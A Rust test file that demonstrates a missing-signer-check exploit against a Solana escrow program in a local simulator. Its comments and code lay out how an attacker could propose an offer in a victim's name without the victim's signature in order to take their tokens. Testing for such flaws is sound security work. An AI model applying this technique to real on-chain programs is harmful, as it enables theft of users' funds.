// Exploit: Missing Signer Check
//
// Vulnerability: The program does not verify that the maker account signed the transaction.
// Attack: Attacker calls ProposeOffer with victim's pubkey as maker, without victim signing.
// Result: Victim's tokens are transferred to the vault without their authorization.
//
// In a real attack, the attacker would:
// 1. Find a victim with tokens they want to steal
// 2. Call ProposeOffer with victim's pubkey as maker
// 3. Later call TakeOffer themselves to receive the victim's tokens

mod utils;

use utils::*;
use litesvm_token::{
    CreateAssociatedTokenAccount, CreateMint, MintTo,
    spl_token::state::Account as TokenAccount,
    get_spl_account,
};
use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    native_token::LAMPORTS_PER_SOL,
    signature::Signer,
    transaction::Transaction,
};
use spl_associated_token_account::get_associated_token_address;
use solana_system_interface::program::ID as SYSTEM_PROGRAM_ID;


#[test]
fn test_exploit_missing_signer() {
    println!("\n=== EXPLOIT TEST: Missing Signer Check ===\n");
    println!("[Scenario] Attacker tries to create an offer using victim's pubkey without victim signing");

    let mut svm = setup_svm();

    // Setup accounts
    let attacker = create_funded_account(&mut svm, 10 * LAMPORTS_PER_SOL);
    let victim = create_funded_account(&mut svm, 5 * LAMPORTS_PER_SOL);

    println!("[Setup] Attacker: {}", attacker.pubkey());
    println!("[Setup] Victim:   {}", victim.pubkey());

    // Create mint and victim's token account
    let mint_a = CreateMint::new(&mut svm, &attacker)
        .authority(&attacker.pubkey())
        .decimals(DECIMALS)
        .send()
        .expect("Failed to create mint A");

    let mint_b = CreateMint::new(&mut svm, &attacker)
        .authority(&attacker.pubkey())
        .decimals(DECIMALS)
        .send()
        .expect("Failed to create mint B");

    // Create victim's ATA and fund it
    let victim_ata_a = CreateAssociatedTokenAccount::new(&mut svm, &attacker, &mint_a)
        .owner(&victim.pubkey())
        .send()
        .expect("Failed to create victim ATA A");

    MintTo::new(&mut svm, &attacker, &mint_a, &victim_ata_a, INITIAL_MINT_AMOUNT)
        .owner(&attacker)
        .send()
        .expect("Failed to mint to victim ATA A");

    // Verify victim has tokens
    let victim_balance_before: TokenAccount = get_spl_account(&svm, &victim_ata_a)
        .expect("Failed to read victim token account");
    println!("[Setup] Victim Token A balance: {}", victim_balance_before.amount);

    // Derive offer PDA using VICTIM's pubkey (not attacker's)
    let offer_id: [u8; 8] = 1u64.to_le_bytes();
    let (offer_pda, bump) = derive_offer_pda(&victim.pubkey(), &offer_id);
    let vault_ata = get_associated_token_address(&offer_pda, &mint_a);

    println!("[Attack] Deriving offer PDA with VICTIM's pubkey");
    println!("[Attack] Offer PDA: {}", offer_pda);

    // Build instruction with victim as maker, but attacker signs
    let ix_data = build_propose_offer_data(
        offer_id,
        TOKEN_B_WANTED_AMOUNT,
        TOKEN_A_OFFER_AMOUNT,
        bump,
    );

    // CRITICAL: victim.pubkey() is passed as maker, but is_signer = false
    // In a secure program, this would be rejected because maker must sign
    let propose_ix = Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(victim.pubkey(), false),  // EXPLOIT: victim as maker, not signing
            AccountMeta::new_readonly(mint_a, false),
            AccountMeta::new_readonly(mint_b, false),
            AccountMeta::new(victim_ata_a, false),
            AccountMeta::new(offer_pda, false),
            AccountMeta::new(vault_ata, false),
            AccountMeta::new_readonly(TOKEN_PROGRAM_ID, false),
            AccountMeta::new_readonly(SYSTEM_PROGRAM_ID, false),
            AccountMeta::new_readonly(ASSOCIATED_TOKEN_PROGRAM_ID, false),
        ],
        data: ix_data,
    };

    // Attacker signs and pays, victim does NOT sign
    let tx = Transaction::new_signed_with_payer(
        &[propose_ix],
        Some(&attacker.pubkey()),
        &[&attacker],  // Only attacker signs, victim does NOT sign
        svm.latest_blockhash(),
    );

    println!("[Attack] Sending ProposeOffer - attacker signs, victim does NOT sign");

    let result = svm.send_transaction(tx);

    // The vulnerable program accepts this because it doesn't check is_signer
    // However, the token transfer CPI will fail because victim didn't sign as authority
    // This demonstrates the vulnerability exists, even if the full attack chain fails at CPI
    match &result {
        Ok(metadata) => {
            println!("[VULNERABLE] Transaction accepted by escrow program!");
            println!("[Result] Logs:");
            for log in &metadata.logs {
                println!("         {}", log);
            }

            // If we get here, check if tokens moved
            let victim_balance_after: TokenAccount = get_spl_account(&svm, &victim_ata_a)
                .expect("Failed to read victim token account");
            println!("[Result] Victim Token A after: {}", victim_balance_after.amount);

            if victim_balance_after.amount < victim_balance_before.amount {
                println!("[EXPLOIT SUCCESS] Victim's tokens stolen without their signature!");
            }
        }
        Err(e) => {
            // The escrow program accepted it (no signer check), but Token program rejected
            // because the victim didn't sign as authority for the transfer.
            // This shows the vulnerability exists - the escrow should have rejected earlier.
            println!("[Result] Transaction failed at CPI level: {:?}", e);
            println!("[Analysis] The escrow program did NOT check maker's signature.");
            println!("[Analysis] It failed later because Token program requires authority signature.");
            println!("[Analysis] In a more complex attack, this could be exploited.");

            let meta = &e.meta;

            // Check the logs to confirm escrow didn't reject for signer
            
                let logs_str = meta.logs.join(" ");
                if !logs_str.contains("MissingRequiredSignature") {
                    println!("[VULNERABLE] Escrow did NOT enforce signer check!");
                }
            
        }
    }

    println!("\n=== END: Missing Signer Check Exploit ===\n");
}
